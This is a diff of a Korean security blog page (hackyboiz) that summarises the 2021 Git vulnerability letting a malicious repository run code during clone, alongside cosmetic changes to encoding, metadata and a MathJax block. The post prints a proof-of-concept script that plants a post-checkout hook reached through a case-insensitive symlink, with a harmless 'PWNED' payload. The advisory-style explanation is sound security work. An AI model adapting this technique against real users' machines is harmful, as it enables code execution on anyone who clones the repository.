@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      261 자
+      459 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      5
+      9
        분
     </span>
   
@@ -242,17 +242,17 @@
               </script>
               <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.openwall.com/lists/oss-security/2021/03/09/3">git: malicious repositories can execute remote code while cloning</a></p>
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul>
-<li>Git(2.14.2.windows.1에서 테스트됨)</li>
+<li>Git(2.14.2.windows.1&#xC5D0;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8;&#xB428;)</li>
 </ul>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>오픈소스 버전 관리 시스템인 Git에서 원격 저장소를 clone 하는 도중 원격 코드 실행이 가능한 취약점이 발견되어 관련 세부 정보가 공개되었습니다.</p>
-<p>취약점의 트리거 조건은 다음과 같습니다.</p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC624;&#xD508;&#xC18C;&#xC2A4; &#xBC84;&#xC804; &#xAD00;&#xB9AC; &#xC2DC;&#xC2A4;&#xD15C;&#xC778; Git&#xC5D0;&#xC11C; &#xC6D0;&#xACA9; &#xC800;&#xC7A5;&#xC18C;&#xB97C; clone &#xD558;&#xB294; &#xB3C4;&#xC911; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xAD00;&#xB828; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>&#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD2B8;&#xB9AC;&#xAC70; &#xC870;&#xAC74;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <ul>
-<li><p>타깃 시스템이 NTFS와 같이 대소문자를 구분하지 않고, 심볼릭 링크를 지원해야 합니다.(Windows 및 macOS의 기본 파일 시스템)</p>
+<li><p>&#xD0C0;&#xAE43; &#xC2DC;&#xC2A4;&#xD15C;&#xC774; NTFS&#xC640; &#xAC19;&#xC774; &#xB300;&#xC18C;&#xBB38;&#xC790;&#xB97C; &#xAD6C;&#xBD84;&#xD558;&#xC9C0; &#xC54A;&#xACE0;, &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xC9C0;&#xC6D0;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.(Windows &#xBC0F; macOS&#xC758; &#xAE30;&#xBCF8; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;)</p>
 </li>
-<li><p>Git LFS와 같이 clean 혹은 smudge 필터가 전역적으로 구성되어있어야 합니다.</p>
+<li><p>Git LFS&#xC640; &#xAC19;&#xC774; clean &#xD639;&#xC740; smudge &#xD544;&#xD130;&#xAC00; &#xC804;&#xC5ED;&#xC801;&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4;&#xC788;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p>
 </li>
 </ul>
-<p>악성 저장소를 생성하는 PoC는 다음과 같습니다.</p>
+<p>&#xC545;&#xC131; &#xC800;&#xC7A5;&#xC18C;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; PoC&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span>
 
   git init delayed-checkout &amp;&amp;
@@ -261,7 +261,7 @@
   	<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;A/post-checkout filter=lfs diff=lfs merge=lfs&quot;</span> \\
   		&gt;.gitattributes &amp;&amp;
   	mkdir A &amp;&amp;
-  	<span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;#!/bin/sh\\n\\necho PWNED &gt;&amp;2\\n&#x27;</span> &gt;A/post-checkout &amp;&amp;
+  	<span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;#!/bin/sh\\n\\necho PWNED &gt;&amp;2\\n&apos;</span> &gt;A/post-checkout &amp;&amp;
   	chmod +x A/post-checkout &amp;&amp;
   	&gt;A/a &amp;&amp;
   	&gt;A/b &amp;&amp;
@@ -273,14 +273,14 @@
   )</code></pre>
 
 <ol>
-<li><p>임의 코드를 실행하는 악성 파일인 <code>A/post-checkout</code>이 저장소에 추가된 후 제거되면 Git 캐시에 남습니다. 이후 <code>./git/hooks</code>의 심볼릭 링크 <code>a</code>를 생성합니다.</p>
+<li><p>&#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xC545;&#xC131; &#xD30C;&#xC77C;&#xC778; <code>A/post-checkout</code>&#xC774; &#xC800;&#xC7A5;&#xC18C;&#xC5D0; &#xCD94;&#xAC00;&#xB41C; &#xD6C4; &#xC81C;&#xAC70;&#xB418;&#xBA74; Git &#xCE90;&#xC2DC;&#xC5D0; &#xB0A8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>./git/hooks</code>&#xC758; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C; <code>a</code>&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <ul>
-<li>git hooks - 특정 이벤트에 실행되는 스크립트</li>
+<li>git hooks - &#xD2B9;&#xC815; &#xC774;&#xBCA4;&#xD2B8;&#xC5D0; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;</li>
 </ul>
 </li>
-<li><p>타깃이 대소문자를 구분하지 않는 파일 시스템이라면 해당 저장소를 clone 할 때 <code>a</code>와 <code>A</code>를 구분하지 못해 <code>./git/hooks/post-checkout</code> 파일이 Git 캐시에 저장된 악성파일인 <code>A/post-checkout</code>로 대체됩니다.</p>
+<li><p>&#xD0C0;&#xAE43;&#xC774; &#xB300;&#xC18C;&#xBB38;&#xC790;&#xB97C; &#xAD6C;&#xBD84;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC774;&#xB77C;&#xBA74; &#xD574;&#xB2F9; &#xC800;&#xC7A5;&#xC18C;&#xB97C; clone &#xD560; &#xB54C; <code>a</code>&#xC640; <code>A</code>&#xB97C; &#xAD6C;&#xBD84;&#xD558;&#xC9C0; &#xBABB;&#xD574; <code>./git/hooks/post-checkout</code> &#xD30C;&#xC77C;&#xC774; Git &#xCE90;&#xC2DC;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xC545;&#xC131;&#xD30C;&#xC77C;&#xC778; <code>A/post-checkout</code>&#xB85C; &#xB300;&#xCCB4;&#xB429;&#xB2C8;&#xB2E4;.</p>
 </li>
-<li><p>git hooks에 의해 <code>post-checkout</code>가 실행되고 <code>post-checkout</code>에 작성된 임의 코드가 실행됩니다.</p>
+<li><p>git hooks&#xC5D0; &#xC758;&#xD574; <code>post-checkout</code>&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xACE0; <code>post-checkout</code>&#xC5D0; &#xC791;&#xC131;&#xB41C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p>
 </li>
 </ol>
 <p><img src="/2021/03/23/l0ch/2021-03-23/image.png" srcset="/img/loading.gif"></p>
@@ -585,6 +585,45 @@
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
